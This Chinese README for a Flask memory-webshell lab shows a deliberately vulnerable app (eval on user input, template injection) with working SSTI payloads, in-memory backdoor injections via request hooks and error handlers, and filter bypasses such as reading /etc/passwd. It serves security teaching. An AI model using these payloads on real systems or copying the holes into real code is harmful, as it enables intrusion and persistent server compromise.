# Flask内存马测试环境

这个项目提供了一个完整的Flask内存马测试环境，用于学习和研究Flask框架中的内存马植入技术。项目包含了易受攻击的Flask应用和自动化植入内存马的测试脚本。

> **注意**：本项目仅用于安全研究和教育目的。请勿在未授权的系统上测试这些技术。

## 什么是内存马？

内存马(Memory Webshell)是一种高级的持久化攻击技术，它不在文件系统中留下文件，而是将恶意代码注入到Web应用程序的内存中。这种技术使得传统的基于文件的检测方法难以发现攻击。

Flask内存马的特点：
- 不写入磁盘文件，只存在于内存中
- 应用重启后会消失
- 可以绕过基于文件系统的安全检测
- 可以通过多种方式实现（请求钩子、错误处理器等）

## 环境准备

### 依赖安装

```bash
pip install flask requests
```

### 启动测试环境

```bash
python 1.py
```

应用将在 `http://127.0.0.1:5000` 上运行。

## 项目结构

- `1.py` - 易受攻击的Flask应用，包含eval执行点和模板注入点
- `test_memory_shell.py` - 自动化测试和植入内存马的脚本

## 漏洞点说明

### 1. 任意代码执行

`/e`路由允许通过`cmd`参数执行任意Python代码：

```python
@app.route('/e')
def e():
    a = eval(request.args.get('cmd', '0'))
    if a:
        return "1"
    else:
        return "0"
```

### 2. 服务器端模板注入(SSTI)

`/test`路由存在模板注入漏洞：

```python
@app.route('/test')
def test():
    template = '''
        <h1>Test Page</h1>
        <p>{{ name }}</p>
    '''
    name = request.args.get('name', 'Guest')
    return render_template_string(template)
```

## 模板注入详解与利用

Flask使用Jinja2作为模板引擎，当用户输入被直接传入`render_template_string`函数时，会产生服务器端模板注入漏洞。本节详细介绍如何测试和利用这个漏洞植入内存马。

### 模板注入基础测试

首先，我们可以通过一些简单的表达式测试是否存在模板注入漏洞：

```
http://127.0.0.1:5000/test?name={{7*7}}
```

如果页面显示`49`而不是原始文本`{{7*7}}`，则确认存在模板注入。

其他测试payload:
```
http://127.0.0.1:5000/test?name={{config}}  # 显示应用配置
http://127.0.0.1:5000/test?name={{request}} # 显示请求对象
http://127.0.0.1:5000/test?name={{self}}    # 在某些情况下显示模板对象
```

### 获取Python代码执行能力

Jinja2模板可以访问Python对象，我们通过以下方式获取Python代码执行权限：

1. **利用`__class__`和`__mro__`获取对象层次结构**

```
http://127.0.0.1:5000/test?name={{''.__class__.__mro__}}
```

2. **访问`__builtins__`获取Python内置函数**

```
http://127.0.0.1:5000/test?name={{request.__class__.__init__.__globals__['__builtins__']}}
```

3. **使用`__import__`导入模块执行命令**

```
http://127.0.0.1:5000/test?name={{request.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
```

### 通过模板注入植入内存马

以下是几种通过模板注入植入内存马的方法：

#### 1. 植入before_request内存马

```
http://127.0.0.1:5000/test?name={{request.__class__.__init__.__globals__['__builtins__']['eval']("app.before_request_funcs.setdefault(None, []).append(lambda :__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read()) if request.args.get('cmd') else None)")}}
```

URL编码版本：
```
http://127.0.0.1:5000/test?name=%7B%7Brequest.__class__.__init__.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D(%22app.before_request_funcs.setdefault(None%2C%20%5B%5D).append(lambda%20%3A__import__(%27flask%27).make_response(__import__(%27os%27).popen(request.args.get(%27cmd%27)).read())%20if%20request.args.get(%27cmd%27)%20else%20None)%22)%7D%7D
```

验证内存马是否成功植入：
```
http://127.0.0.1:5000/?cmd=whoami
```

#### 2. 植入after_request内存马

```
http://127.0.0.1:5000/test?name={{request.__class__.__init__.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: __import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read()) if request.args.get('cmd') else resp)")}}
```

#### 3. 植入errorhandler内存马

```
http://127.0.0.1:5000/test?name={{request.__class__.__init__.__globals__['__builtins__']['exec']("global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()")}}
```

验证errorhandler内存马：
```
http://127.0.0.1:5000/not_exist_path?cmd=id
```

### 绕过技巧

在面临过滤和防护的环境中，可以使用以下技巧：

1. **使用`request.args`动态获取参数**
```
http://127.0.0.1:5000/test?name={{request.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).popen(request.args.d).read()}}&a=__builtins__&b=__import__&c=os&d=whoami
```

2. **使用`attr`过滤器代替点号**
```
http://127.0.0.1:5000/test?name={{request|attr('__class__')|attr('__init__')|attr('__globals__')}}
```

3. **字符串拼接绕过关键字过滤**
```
http://127.0.0.1:5000/test?name={{().__class__.__bases__[0].__subclasses__()[40]('/et'+'c/pa'+'sswd').read()}}
```

4. **使用`url_for`、`get_flashed_messages`等Flask特有对象**
```
http://127.0.0.1:5000/test?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
```

### 常见错误和解决方法

1. **路径错误**: 如果命令执行失败，可能是路径问题，尝试使用绝对路径
2. **权限问题**: 检查Web应用运行用户的权限
3. **转义问题**: 确保特殊字符被正确URL编码
4. **引号问题**: 在嵌套引号时使用不同类型的引号（单引号、双引号）

## 内存马实现方法

Flask框架中可以通过多种方式实现内存马：

### 1. before_request钩子

在每个请求处理前执行的函数，可用于内存马植入：

```python
app.before_request_funcs.setdefault(None, []).append(lambda: ...)
```

### 2. after_request钩子

在每个请求处理后执行的函数：

```python
app.after_request_funcs.setdefault(None, []).append(lambda resp: ...)
```

### 3. errorhandler处理器

当特定错误发生时执行的函数，如404错误：

```python
app.error_handler_spec[None][code][exc_class] = lambda a: ...
```

### 4. add_url_rule添加路由

直接添加新的路由（在新版Flask中可能受限）：

```python
app.add_url_rule('/shell', 'shell', lambda: ...)
```

## 自动测试脚本使用

`test_memory_shell.py`脚本可自动植入和测试各种内存马：

```bash
# 测试所有类型的内存马
python test_memory_shell.py

# 只测试特定类型的内存马
python test_memory_shell.py --method before  # before_request内存马
python test_memory_shell.py --method after   # after_request内存马
python test_memory_shell.py --method error   # errorhandler内存马
python test_memory_shell.py --method ssti    # 通过SSTI植入内存马
python test_memory_shell.py --method url_rule # 通过add_url_rule植入内存马
```

## 内存马测试方法

### 方法一：使用测试脚本

直接运行`test_memory_shell.py`测试所有内存马：

```bash
python test_memory_shell.py
```

### 方法二：手动测试

#### 1. 植入before_request内存马

访问以下URL：

```
http://127.0.0.1:5000/e?cmd=app.before_request_funcs.setdefault(None,[]).append(lambda:__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())if request.args.get('cmd')else None)
```

验证内存马：

```
http://127.0.0.1:5000/?cmd=whoami
```

#### 2. 植入errorhandler内存马

访问以下URL：

```
http://127.0.0.1:5000/e?cmd=exec("global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()")
```

验证内存马：

```
http://127.0.0.1:5000/nonexistent?cmd=whoami
```

## 防御措施

以下是一些防御Flask内存马的措施：

1. **避免使用eval和exec**：不要在Web应用中使用`eval`和`exec`函数处理用户输入
2. **模板注入防护**：避免将用户输入直接传入`render_template_string`函数
3. **限制权限**：使用低权限用户运行Flask应用
4. **监控异常行为**：监控应用的内存占用和网络连接
5. **定期重启**：定期重启应用可以清除内存中的恶意代码
6. **使用WSGI服务器**：在生产环境中使用多进程WSGI服务器如Gunicorn

## 参考资料

- [新版FLASK下python内存马的研究](https://www.cnblogs.com/gxngxngxn/p/18181936)
- [Flask官方文档](https://flask.palletsprojects.com/)
- [Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)

## 免责声明

本项目仅用于教育和研究目的，帮助安全研究人员和开发者了解Web应用中的安全风险。请勿将本项目用于未授权的渗透测试或攻击行为。使用本项目造成的任何后果由使用者自行承担。 